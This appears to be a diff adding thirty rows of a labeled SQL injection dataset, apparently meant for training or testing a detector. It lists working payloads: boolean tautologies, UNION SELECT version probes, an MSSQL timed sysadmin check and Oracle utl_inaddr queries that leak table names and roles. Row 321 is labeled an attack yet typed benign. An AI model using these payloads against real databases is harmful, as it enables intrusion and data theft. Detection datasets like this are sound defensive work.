@@ -1,0 +1,31 @@
+row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
+300,"select * from users where id = 1 or ""1]"" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
+301,"select * from users where id = 1 or ""$?"" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
+302,or x = x,1,,boolean_blind,generic,0.85,or x = x detected — boolean_blind injection (priority 8) on generic,rule-based
+303,or a = a,1,,boolean_blind,generic,0.85,or a = a detected — boolean_blind injection (priority 8) on generic,rule-based
+304,or '1' = '1,1,,boolean_blind,generic,0.85,or '1' = '1 detected — boolean_blind injection (priority 8) on generic,rule-based
+305,"select * from users where id = 11<1# union select 1,version ( ) -- 1",1,,union_based,generic,0.95,union select detected — union_based injection (priority 7) on generic,rule-based
+306,) ) or ( ( 'x' ) ) = ( ( 'x,1,,boolean_blind,generic,0.95,) or ( detected — boolean_blind injection (priority 8) on generic,rule-based
+307,"select * from users where id = '1' or \.<1 union select 1,@@VERSION -- 1'",1,,union_based,mysql,0.95,union select detected — union_based injection (priority 7) on mysql,rule-based
+308,"select * from users where id = '1' <@&1 union select 1,version ( ) -- 1'",1,,union_based,generic,0.95,"union select, @&1 union select detected — union_based injection (priority 7) on generic",rule-based
+309,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( table_name ) FROM ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables ) WHERE LIMIT = 4 ) ) AND 'i' = 'i",1,,out_of_band,oracle,0.95,utl_inaddr detected — out_of_band injection (priority 2) on oracle,rule-based
+310,; if is_srvrolemember ( 'sysadmin' ) > 0 waitfor delay '0:0:2' --,1,,time_blind,mssql,0.95,waitfor delay is MSSQL-specific time-delay function — time-based blind inference (priority 5),rule-based
+311,select * from users where id = 1 <@<@ or 1 = 1 -- 1,1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
+312,"select * from users where id = 1 union select @<@$,version ( ) -- 1",1,,union_based,generic,0.95,union select detected — union_based injection (priority 7) on generic,rule-based
+313,"select * from users where id = '1' <@<@ union select 1,version ( ) -- 1'",1,,union_based,generic,0.95,"union select, @<@ union select detected — union_based injection (priority 7) on generic",rule-based
+314,"select * from users where id = 1 or ""$_"" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
+315,"select * from users where id = 1 or 1#""{ union select version ( ) ,version ( ) -- 1",1,,union_based,generic,0.95,union select detected — union_based injection (priority 7) on generic,rule-based
+316,a' or 1 = 1--,1,,boolean_blind,generic,0.85,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
+317,) or ( a = a,1,,boolean_blind,generic,0.85,) or ( detected — boolean_blind injection (priority 8) on generic,rule-based
+318,""" ) ) or ( ( ""x"" ) ) = ( ( ""x",1,,boolean_blind,generic,0.95,) or ( detected — boolean_blind injection (priority 8) on generic,rule-based
+319,"select * from users where id = 1 or 1#""; or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
+320,"select * from users where id = '1' <@$_ union select 1,version ( ) -- 1'",1,,union_based,generic,0.95,"union select, @$_ union select detected — union_based injection (priority 7) on generic",rule-based
+321,-- &password =,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+322,select * from users where id = 1 <@. or 1 = 1 -- 1,1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
+323,"select * from users where id = 1 or "" ( ) "" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
+324,"select * from users where id = 1 %$ 1 union select null,@@VERSION -- 1",1,,union_based,mysql,0.95,union select detected — union_based injection (priority 7) on mysql,rule-based
+325,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( granted_role ) FROM ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER ) WHERE LIMIT = 3 ) ) AND 'i' = 'i",1,,out_of_band,oracle,0.95,utl_inaddr detected — out_of_band injection (priority 2) on oracle,rule-based
+326,admin' or 1 = 1,1,,boolean_blind,generic,0.85,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
+327,"select * from users where id = 1 or "";,"" = 1 or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
+328,"select * from users where id = 1 union select @||1,version ( ) -- 1",1,,union_based,generic,0.95,union select detected — union_based injection (priority 7) on generic,rule-based
+329,"select * from users where id = 1 +\+. union select null,@@VERSION -- 1",1,,union_based,mysql,0.95,union select detected — union_based injection (priority 7) on mysql,rule-based
